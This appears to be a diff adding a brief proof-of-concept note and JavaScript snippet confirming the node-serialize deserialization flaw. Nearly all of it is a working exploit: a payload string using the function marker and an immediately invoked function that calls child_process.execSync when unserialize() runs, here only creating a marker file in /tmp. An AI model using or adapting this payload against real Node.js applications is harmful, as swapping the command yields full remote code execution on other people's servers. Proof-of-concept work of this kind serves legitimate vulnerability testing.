@@ -1,0 +1,12 @@
+Confirmed: classic `node-serialize` RCE via IIFE-wrapped function payload evaluated by `eval` in `unserialize`.
+
+```javascript
+const serialize = require("node-serialize");
+
+// Payload: a function-flagged string whose IIFE body executes on eval() during unserialize()
+const payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').execSync(\'touch /tmp/pwned_node_serialize\');}()"}';
+
+serialize.unserialize(payload);
+
+console.log("Exploit executed: check for /tmp/pwned_node_serialize");
+```
